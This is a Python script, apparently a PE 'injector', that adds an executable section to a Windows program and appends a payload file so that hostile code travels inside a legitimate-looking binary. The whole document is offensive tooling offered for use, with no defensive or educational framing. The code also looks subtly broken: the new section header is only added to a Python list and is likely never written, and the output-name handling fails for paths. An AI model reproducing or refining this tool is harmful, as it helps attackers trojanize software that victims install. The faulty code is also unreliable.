import pefile
import os
import sys

def inject_payload(target, payload_path):
    # Load the target PE file
    pe = pefile.PE(target)
    
    # Read the payload content
    with open(payload_path, 'rb') as payload_file:
        payload_data = payload_file.read()
    
    # Create a new section
    new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
    new_section.Name = b'.injected\x00'
    new_section.set_file_offset(pe.sections[-1].get_file_offset() + pe.sections[-1].sizeof())
    new_section.Misc_VirtualSize = len(payload_data)
    new_section.SizeOfRawData = (len(payload_data) + pe.OPTIONAL_HEADER.FileAlignment - 1) // pe.OPTIONAL_HEADER.FileAlignment * pe.OPTIONAL_HEADER.FileAlignment
    new_section.PointerToRawData = os.path.getsize(target)
    new_section.VirtualAddress = (pe.sections[-1].VirtualAddress + pe.sections[-1].Misc_VirtualSize + pe.OPTIONAL_HEADER.SectionAlignment - 1) // pe.OPTIONAL_HEADER.SectionAlignment * pe.OPTIONAL_HEADER.SectionAlignment
    new_section.Characteristics = 0x60000020  # Executable, readable, contains code

    # Append the new section
    pe.sections.append(new_section)
    
    # Adjust the number of sections in the header
    pe.FILE_HEADER.NumberOfSections += 1
    
    # Adjust the size of the image in the optional header
    pe.OPTIONAL_HEADER.SizeOfImage = new_section.VirtualAddress + new_section.Misc_VirtualSize
    
    # Write the modified PE
    pe.write(filename='modified_' + target)

    # Append payload to modified target
    with open('modified_' + target, 'ab') as modified_file:
        modified_file.write(payload_data)

    print(f'Injected {payload_path} into {target} with modifications.')

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print('Usage: python injector.py <target> <payload>')
        sys.exit(1)
        
    target = sys.argv[1]
    payload_path = sys.argv[2]
    
    inject_payload(target, payload_path)
